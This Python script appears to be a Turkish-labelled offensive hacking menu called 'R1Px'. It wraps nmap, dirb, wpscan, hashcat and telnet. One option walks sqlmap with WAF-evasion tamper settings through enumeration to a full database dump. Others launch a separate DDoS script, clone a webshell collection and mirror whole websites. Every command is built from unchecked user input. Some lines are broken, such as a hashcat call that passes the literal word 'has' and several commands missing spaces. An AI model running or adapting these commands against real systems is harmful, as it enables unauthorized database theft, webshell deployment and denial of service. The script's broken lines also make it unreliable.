#!/usr/bin/env python
#-*- coding: utf-8 -*-
import os 
import requests
import time
os.system("clear")


PEMBE = '\033[95m'
MAVİ = '\033[94m'
YESİL = '\033[92m'
SARI = '\033[93m'
KIRMIZI = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'


print(KIRMIZI + """
                                                                        
                                                                        
RRRRRRRRRRRRRRRRR      1111111    PPPPPPPPPPPPPPPPP                       
R::::::::::::::::R    1::::::1    P::::::::::::::::P                      
R::::::RRRRRR:::::R  1:::::::1    P::::::PPPPPP:::::P                     
RR:::::R     R:::::R 111:::::1    PP:::::P     P:::::P                    
  R::::R     R:::::R    1::::1      P::::P     P:::::P xxxxxxx      xxxxxxx
  R::::R     R:::::R    1::::1      P::::P     P:::::P  x:::::x    x:::::x 
  R::::RRRRRR:::::R     1::::1      P::::PPPPPP:::::P    x:::::x  x:::::x  
  R:::::::::::::RR      1::::l      P:::::::::::::PP      x:::::xx:::::x   
  R::::RRRRRR:::::R     1::::l      P::::PPPPPPPPP         x::::::::::x    
  R::::R     R:::::R    1::::l      P::::P                  x::::::::x     
  R::::R     R:::::R    1::::l      P::::P                  x::::::::x     
  R::::R     R:::::R    1::::l      P::::P                 x::::::::::x    
RR:::::R     R:::::R 111::::::111 PP::::::PP              x:::::xx:::::x   
R::::::R     R:::::R 1::::::::::1 P::::::::P             x:::::x  x:::::x  
R::::::R     R:::::R 1::::::::::1 P::::::::P            x:::::x    x:::::x 
RRRRRRRR     RRRRRRR 111111111111 PPPPPPPPPP           xxxxxxx      xxxxxxx                         

HOŞGELDIN !!!

1:  Port Scan
2:  Web Extension Browsing
3:  Worpress Scan
4:  MD5 (hash)
5:  SHA2-256 (hash)
6:  FREE PROXY 
7:  DDOS Attack
8:  SQL Scan
9:  FTP
10: Telnet
11: Download WebShell
12: Web Site Copy
""")

islem = input(BOLD+MAVİ+"R1Px~#  ")

if(islem == "1"):
	ip = input("Enter Destination IP : ")
	os.system("nmap " + " -sC " + " -sV " + ip + " -Pn ")

elif(islem == "2"):
	print("http://domain.com/ https://domain.com/")
	web = input("Web sitesini giriniz: ")
	os.system("dirb " + web)

elif(islem == "3"):
	wp = input("Enter website : ")
	os.system("wpscan " + " --url " + wp)

elif(islem == "4"):
	hash = input("Enter HASH: ")
	os.system("hashcat " + "-m 0 " + " -a 0 " + hash + " " "/usr/share/wordlists/rockyou.txt")
	
elif(islem == "5"):
	has = input("Enter HASH : ")
	os.system("hashcat -m 1400 " " -a 0 " + " has " "/usr/share/wordlists/rockyou.txt")

elif(islem == "6"):
	print("LOADIND !")
	os.system("python3 proxy.py")
	print("File --> /root/Desktop/proxy.txt")

elif(islem == "7"):
	os.system("python ddos.py")

elif(islem == "8"):
	print("")
	site = input("Sitenizi Giriniz: ")
	print("")

	os.system("sqlmap -u " + site + " --dbs --random-agent --skip-waf --tamper=between,randomcase,space2comment --level=3 --risk=3 --no-cast --threads=10 --batch -v 5xx")

	print("")
	database = input("Database Giriniz: ")
	print("")

	os.system("sqlmap -u " + site + "-D " + database  + " --tables --random-agent --skip-waf --tamper=between,randomcase,space2comment --level=3 --risk=3 --no-cast --threads=10 --batch -v 5xx")

	print("")
	tables = input("Tablo Giriniz: ")
	print("")

	os.system("sqlmap -u " + site + "-D " + database + " -T " + tables + " --columns --random-agent --skip-waf --tamper=between,randomcase,space2comment --level=3 --risk=3 --no-cast --threads=10 --batch -v 5xx")

	print("")
	kolon = input("Kolon Giriniz: ")
	print("")

	os.system("sqlmap -u " + site + "-D " + database + " -T " + tables + " -C " + kolon + " --dump --random-agent --skip-waf --tamper=between,randomcase,space2comment --level=3 --risk=3 --no-cast --threads=10 --batch -v 5xx")

elif(islem == "9"):
	print("IP or ftpsite.com")
	print("Test To username and password = anonymous")
	ftp = input("Site: ")
	os.system("ftp " + ftp)

elif(islem == "10"):
	print("IP exp: 127.0.0.1")
	tel = input("Site: ")
	os.system("telnet" + tel)

elif(islem == "11"):
	print("WebShell Installing")
	os.system("git clone https://github.com/tennc/webshell")

elif(islem == "12"):
	print("https://site.com/ or http://")
	wget = input("Site: ")
	os.system("wget " + "-r -p -U Mozilla --wait=10 --limit-rate=35K " + wget)

else:
	("ERROR !!!")
